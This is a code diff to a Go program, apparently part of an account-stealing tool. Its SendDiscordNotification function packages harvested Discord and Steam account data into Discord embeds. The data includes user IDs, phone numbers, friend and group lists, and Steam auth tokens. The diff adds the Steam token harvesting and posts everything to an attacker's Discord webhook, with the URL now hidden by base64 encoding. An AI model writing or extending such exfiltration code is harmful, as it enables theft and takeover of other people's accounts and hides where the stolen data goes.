@@ -1,13 +1,14 @@
 package main
 
 import (
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"net/http"
 	"strings"
 )
 
-const DiscordWebhookUrl = ""
+var discordWebhookUrl string
 
 type DiscordMessage struct {
 	Content string         `json:"content"`
@@ -20,6 +21,7 @@ type DiscordEmbed struct {
 	Fields      []DiscordEmbedField    `json:"fields,omitempty"`
 	Footer      *DiscordEmbedFooter    `json:"footer,omitempty"`
 	Thumbnail   *DiscordEmbedThumbnail `json:"thumbnail,omitempty"`
+	URL         string                 `json:"url,omitempty"`
 }
 
 type DiscordEmbedField struct {
@@ -121,12 +123,12 @@ func SendDiscordNotification() error {
 				},
 				{
 					Name: "📱 Phone",
-					Value: fmt.Sprintf("`%s`", func() string {
+					Value: func() string {
 						if account.Phone != nil {
-							return *account.Phone
+							return fmt.Sprintf("`%s`", *account.Phone)
 						}
 						return "None"
-					}()),
+					}(),
 					Inline: true,
 				},
 				{
@@ -140,9 +142,75 @@ func SendDiscordNotification() error {
 					Inline: false,
 				},
 			},
+			URL: fmt.Sprintf("https://discord.com/users/%s", account.ID),
 			Thumbnail: &DiscordEmbedThumbnail{
 				URL: account.AvatarURL,
 			},
+			Footer: &DiscordEmbedFooter{
+				Text: fmt.Sprintf("Found in: %s", account.FoundIn),
+			},
+		})
+	}
+	for _, account := range steamAccountResults {
+		embeds = append(embeds, DiscordEmbed{
+			Title: fmt.Sprintf("Steam Account: %s", account.Username),
+			Fields: []DiscordEmbedField{
+				{
+					Name:   "🆔 ID",
+					Value:  fmt.Sprintf("`%s`", account.SteamID),
+					Inline: true,
+				},
+				{
+					Name:   "👤 Account Name",
+					Value:  fmt.Sprintf("`%s`", account.AccountName),
+					Inline: true,
+				},
+				{
+					Name:   "🧑 Username",
+					Value:  fmt.Sprintf("`%s`", account.Username),
+					Inline: true,
+				},
+				{
+					Name: fmt.Sprintf("👥 Friends (%d)", len(account.Friends)),
+					Value: func() string {
+						if len(account.Friends) > 0 {
+							str := strings.Join(account.Friends, ", ")
+							if len(str) > 1024 {
+								return str[:1021] + "..."
+							}
+						}
+						return "None"
+					}(),
+					Inline: false,
+				},
+				{
+					Name: fmt.Sprintf("👪 Groups (%d)", len(account.Groups)),
+					Value: func() string {
+						if len(account.Groups) > 0 {
+							str := strings.Join(account.Groups, ", ")
+							if len(str) > 1024 {
+								return str[:1021] + "..."
+							}
+						}
+						return "None"
+					}(),
+					Inline: false,
+				},
+				{
+					Name: "🔐 Auth Token",
+					Value: func() string {
+						if account.AuthToken != "" {
+							return fmt.Sprintf("```\n%s\n```", account.AuthToken)
+						}
+						return "Not Found"
+					}(),
+					Inline: true,
+				},
+			},
+			Thumbnail: &DiscordEmbedThumbnail{
+				URL: account.AvatarURL,
+			},
+			URL: fmt.Sprintf("https://steamcommunity.com/profiles/%s", account.SteamID),
 			Footer: &DiscordEmbedFooter{
 				Text: fmt.Sprintf("Found in: %s", account.FoundIn),
 			},
@@ -154,7 +222,8 @@ func SendDiscordNotification() error {
 		Embeds:  embeds,
 	}
 	payload, _ := json.Marshal(message)
-	res, err := http.Post(DiscordWebhookUrl, "application/json", strings.NewReader(string(payload)))
+	decoded, _ := base64.StdEncoding.DecodeString(discordWebhookUrl)
+	res, err := http.Post(string(decoded), "application/json", strings.NewReader(string(payload)))
 	if err != nil {
 		return err
 	}
